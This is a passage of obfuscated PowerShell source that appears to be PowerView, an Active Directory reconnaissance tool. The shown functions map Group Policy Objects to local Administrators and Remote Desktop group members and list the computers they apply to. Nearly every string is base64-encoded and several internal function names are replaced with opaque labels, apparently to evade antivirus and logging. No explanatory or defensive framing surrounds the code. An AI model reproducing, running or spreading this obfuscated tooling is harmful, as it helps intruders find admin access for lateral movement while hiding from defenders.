        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Switch]
        ${f16},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${48} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${217} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${217}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${217}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${217}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${245} = [System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        f97 @48 | % {
            ${238} = $_.displayname
            $GPOname = $_.name
            ${229} = $_.gpcfilesyspath
            ${214} =  @{ 'GptTmplPath' = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADIAMgA5AH0AXABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA='))) }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${214}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${246} = f96 @214
            if (${246} -and (${246}.psbase.Keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwACAATQBlAG0AYgBlAHIAcwBoAGkAcAA='))))) {
                ${243} = @{}
                ForEach (${50} in ${246}.'Group Membership'.GetEnumerator()) {
                    ${212}, $Relation = ${50}.Key.Split('__', ${245}) | % {$_.Trim()}
                    ${244} = ${50}.Value | ? {$_} | % { $_.Trim('*') } | ? {$_}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
                        ${239} = @()
                        ForEach (${204} in ${244}) {
                            if (${204} -and (${204}.Trim() -ne '')) {
                                if (${204} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                    ${241} = @{'ObjectName' = ${204}}
                                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${241}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                    ${240} = f102 @241
                                    if (${240}) {
                                        ${239} += ${240}
                                    }
                                    else {
                                        ${239} += ${204}
                                    }
                                }
                                else {
                                    ${239} += ${204}
                                }
                            }
                        }
                        ${244} = ${239}
                    }
                    if (-not ${243}[${212}]) {
                        ${243}[${212}] = @{}
                    }
                    if (${244} -isnot [System.Array]) {${244} = @(${244})}
                    ${243}[${212}].Add($Relation, ${244})
                }
                ForEach (${50} in ${243}.GetEnumerator()) {
                    if (${50} -and ${50}.Key -and (${50}.Key -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcACoA'))))) {
                        ${242} = ${50}.Key.Trim('*')
                        if (${242} -and (${242}.Trim() -ne '')) {
                            ${45} = f94 -438 ${242} @217
                        }
                        else {
                            ${45} = $False
                        }
                    }
                    else {
                        ${45} = ${50}.Key
                        if (${45} -and (${45}.Trim() -ne '')) {
                            if (${45} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                                ${242} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                            }
                            elseif (${45} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                                ${242} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                            }
                            elseif (${45} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                                ${242} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                            }
                            elseif (${45}.Trim() -ne '') {
                                ${241} = @{'ObjectName' = ${45}}
                                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${241}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                ${242} = f102 @241
                            }
                            else {
                                ${242} = $Null
                            }
                        }
                    }
                    ${219} = New-Object PSObject
                    ${219} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${238}
                    ${219} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
                    ${219} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${229}
                    ${219} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZABHAHIAbwB1AHAAcwA=')))
                    ${219} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIAcwA='))) $Null
                    ${219} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${45}
                    ${219} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) ${242}
                    ${219} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) ${50}.Value.Memberof
                    ${219} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) ${50}.Value.Members
                    ${219}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBHAHIAbwB1AHAA'))))
                    ${219}
                }
            }
            ${214} =  @{
                'GroupsXMLpath' = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADIAMgA5AH0AXABNAEEAQwBIAEkATgBFAFwAUAByAGUAZgBlAHIAZQBuAGMAZQBzAFwARwByAG8AdQBwAHMAXABHAHIAbwB1AHAAcwAuAHgAbQBsAA==')))
            }
            f103 @214 | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
                    ${239} = @()
                    ForEach (${204} in $_.GroupMembers) {
                        if (${204} -and (${204}.Trim() -ne '')) {
                            if (${204} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                ${241} = @{'ObjectName' = ${45}}
                                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${241}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                ${240} = f102 -Domain $Domain -460 ${204}
                                if (${240}) {
                                    ${239} += ${240}
                                }
                                else {
                                    ${239} += ${204}
                                }
                            }
                            else {
                                ${239} += ${204}
                            }
                        }
                    }
                    $_.GroupMembers = ${239}
                }
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${238}
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAbwBsAGkAYwB5AFAAcgBlAGYAZQByAGUAbgBjAGUAcwA=')))
                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBHAHIAbwB1AHAA'))))
                $_
            }
        }
    }
}
function Get-DomainGPOUserLocalGroupMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${220} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ${235} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) {
            ${235} += f98 @220 -Identity $Identity | select -Expand objectsid
            ${234} = ${235}
            if (-not ${235}) {
                Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAFMASQBEACAAZgBvAHIAIABpAGQAZQBuAHQAaQB0AHkAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcA')))
            }
        }
        else {
            ${235} = @('*')
        }
        if ($LocalGroup -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))) {
            ${237} = $LocalGroup
        }
        elseif ($LocalGroup -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAA==')))) {
            ${237} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
        }
        else {
            ${237} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
        }
        if (${235}[0] -ne '*') {
            ForEach (${77} in ${235}) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABFAG4AdQBtAGUAcgBhAHQAaQBuAGcAIABuAGUAcwB0AGUAZAAgAGcAcgBvAHUAcAAgAG0AZQBtAGIAZQByAHMAaABpAHAAcwAgAGYAbwByADoAIAAnACQAewA3ADcAfQAnAA==')))
                ${235} += f70 @220 -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))) -f22 ${77} | select -ExpandProperty objectsid
            }
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABUAGEAcgBnAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABTAEkARAA6ACAAJAB7ADIAMwA3AH0A')))
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABFAGYAZgBlAGMAdABpAHYAZQAgAHQAYQByAGcAZQB0ACAAZABvAG0AYQBpAG4AIABTAEkARABzADoAIAAkAHsAMgAzADUAfQA=')))
        ${236} = f99 @220 -f16 | % {
            ${219} = $_
            if (${219}.GroupSID -match ${237}) {
                ${219}.GroupMembers | ? {$_} | % {
                    if ( (${235}[0] -eq '*') -or (${235} -Contains $_) ) {
                        ${219}
                    }
                }
            }
            if ( (${219}.GroupMemberOf -contains ${237}) ) {
                if ( (${235}[0] -eq '*') -or (${235} -Contains ${219}.GroupSID) ) {
                    ${219}
                }
            }
        } | sort -Property GPOName -Unique
        ${236} | ? {$_} | % {
            $GPOname = $_.GPODisplayName
            ${230} = $_.GPOName
            ${229} = $_.GPOPath
            ${228} = $_.GPOType
            if ($_.GroupMembers) {
                ${221} = $_.GroupMembers
            }
            else {
                ${221} = $_.GroupSID
            }
            ${233} = $_.Filters
            if (${235}[0] -eq '*') {
                ${231} = ${221}
            }
            else {
                ${231} = ${234}
            }
            f101 @220 -Raw -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQA='))) -f26 ${230} | % {
                if (${233}) {
                    ${232} = f79 @220 -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -SearchBase $_.Path | ? {$_.distinguishedname -match (${233}.Value)} | select -ExpandProperty dnshostname
                }
                else {
                    ${232} = f79 @220 -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))) -SearchBase $_.Path | select -ExpandProperty dnshostname
                }
                if (${232}) {
                    if (${232} -isnot [System.Array]) {${232} = @(${232})}
                    ForEach (${77} in ${231}) {
                        $Object = f98 @220 -Identity ${77} -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
                        ${206} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                        ${227} = New-Object PSObject
                        ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                        ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                        ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $Object.objectsid
                        ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
                        ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${206}
                        ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
                        ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${230}
                        ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${229}
                        ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${228}
                        ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.Properties.distinguishedname
                        ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${232}
                        ${227}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcA'))))
                        ${227}
                    }
                }
            }
            f100 @220 -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAHQAZQBvAGIAagBlAGMAdABiAGwALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUA'))) -f26 ${230} | % {
                ForEach (${77} in ${231}) {
                    $Object = f98 @220 -Identity ${77} -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
                    ${206} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                    ${227} = New-Object PSObject
                    ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                    ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                    ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $Object.objectsid
                    ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${206}
                    ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
                    ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
                    ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${230}
                    ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${229}
                    ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${228}
                    ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.distinguishedname
                    ${227} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $_.siteobjectbl
                    ${227}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcA'))))
                    ${227}
                }
            }
        }
    }
}
function Get-DomainGPOComputerLocalGroupMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        ${f15},
        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $OUIdentity,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${220} = @{}
